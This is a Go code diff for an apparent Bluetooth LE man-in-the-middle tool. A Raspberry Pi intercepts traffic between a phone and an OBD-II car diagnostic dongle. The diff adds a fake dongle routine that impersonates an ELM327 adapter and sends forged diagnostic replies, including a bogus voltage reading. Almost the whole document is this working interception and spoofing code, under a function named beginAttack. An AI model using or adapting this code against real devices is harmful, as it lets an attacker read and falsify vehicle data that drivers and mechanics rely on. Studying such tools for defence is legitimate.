@@ -57,11 +57,17 @@ func NewCountTestService() *gatt.Service {
 	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
 		func(r gatt.Request, data []byte) (status byte) {
 			fmt.Println("| Ready to handle data from phone")
-			publicDataFromPhone = data // data sent to dongle
+			fmt.Println("| Waiting for dongle to connect ...")
 			isPhoneConnected = true
+			for isDongleConnected == false {
+				// waiting for dongle is connected
+			}
+			fmt.Println("| Phone sent: " + string(data))
+			publicDataFromPhone = data // data sent to dongle
 			for len(publicDataFromDongle) == 0 {
 				// infinite loop waiting on notification from dongle
 			}
+			fmt.Println("| Notification recieved back: " + string(publicDataFromDongle))
 			phone.Write(publicDataFromDongle)
 			publicDataFromDongle = []byte("")
 			fmt.Println("Dongle -> RPI -> Phone")
@@ -156,9 +162,9 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			if strings.Contains(c.Properties().String(), "write") {
 				fmt.Println("| Ready to write commands towards dongle ... ")
 				isDongleConnected = true
-				//p.WriteCharacteristic(c, []byte("ATZ\r\n"), false)
 				for isPhoneConnected && len(publicDataFromPhone) != 0 {
 					p.WriteCharacteristic(c, []byte("ATZ\r\n"), false)
+					publicDataFromPhone = []byte("")
 				}
 			}
 
@@ -198,6 +204,8 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			// Subscribe the characteristic, if possible.
 			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
 				f := func(c *gatt.Characteristic, b []byte, err error) {
+					// notify back to RPI -> Phone:
+					publicDataFromDongle = b
 					fmt.Printf("notified: % X | %q\n", b, b)
 				}
 				if err := p.SetNotifyValue(c, f); err != nil {
@@ -278,17 +286,68 @@ func beginAttack() {
 		return
 	}
 	fmt.Println("| gattDevice succesfully created.")
-	fmt.Println("| Trying to capture connection between Raspberry PI with VHM-ble")
-	go connectToDongle(gattDevice)
+	fmt.Println("| Trying to capture connection between Raspberry PI with mobile phone ...")
 
-	for isDongleConnected == false {
-		// infinite loop until dongle is connected
+	go connectToPhone(gattDevice)
+
+	for isPhoneConnected == false {
+		// infinite loop until phone is connected
 	}
 
 	// Dongle is connected
-	fmt.Println("| Trying to capture connection between Raspberry PI with mobile phone ...")
-	connectToPhone(gattDevice)
+	fmt.Println("| Trying to capture connection between Raspberry PI with VHM-ble")
+	//connectToDongle(gattDevice)
+	fakeDongle()
+
 }
+
+func fakeOutput() {
+	for len(publicDataFromPhone) != 0 {
+		var stringData = string(publicDataFromPhone)
+		switch {
+		case strings.Contains(stringData, "ATZ"):
+			publicDataFromDongle = []byte("ELM327 v1.5\r>")
+		case strings.Contains(stringData, "ATD"):
+			publicDataFromDongle = []byte("OK\r\n>OK\r\n>")
+		case strings.Contains(stringData, "ATH1"):
+			publicDataFromDongle = []byte("OK\r\n>OK\r\n>")
+		case strings.Contains(stringData, "ATL0"):
+			publicDataFromDongle = []byte("OK\r>OK\r>")
+		case strings.Contains(stringData, "ATS0"):
+			publicDataFromDongle = []byte("OK\r>OK\r>")
+		case strings.Contains(stringData, "ATSP0"):
+			publicDataFromDongle = []byte("OK\r>OK\r>")
+		case strings.Contains(stringData, "0100"):
+			publicDataFromDongle = []byte("?\r>")
+		case strings.Contains(stringData, "0120"):
+			publicDataFromDongle = []byte("86F1114100BE3FB8118F\r\r>")
+		case strings.Contains(stringData, "0130"):
+			publicDataFromDongle = []byte("83F1117F011217\r\r>83F1117F011217\r\r>")
+		case strings.Contains(stringData, "013C"):
+			publicDataFromDongle = []byte("83F1117F011217\r\r>")
+		case strings.Contains(stringData, "ATMA"):
+			publicDataFromDongle = []byte("?\r>?\r>")
+		case strings.Contains(stringData, "AT RV"):
+			publicDataFromDongle = []byte("6969.69V\r>")
+		
+		default:
+			publicDataFromDongle = []byte("?\r>")
+			fmt.Println("Unknown command: '" + stringData + "'")
+		}
+		publicDataFromPhone = []byte("")
+	}
+}
+
+func fakeDongle() {
+	isDongleConnected = true
+	fmt.Println("------------ FAKE DONGLE STARTED ------------")
+	fmt.Println("| Ready to write commands towards dongle ... ")
+
+	for isPhoneConnected {
+		fakeOutput()
+	}
+}
+
 
 func main() {
 	cmd := flag.String("autostart", "", "")
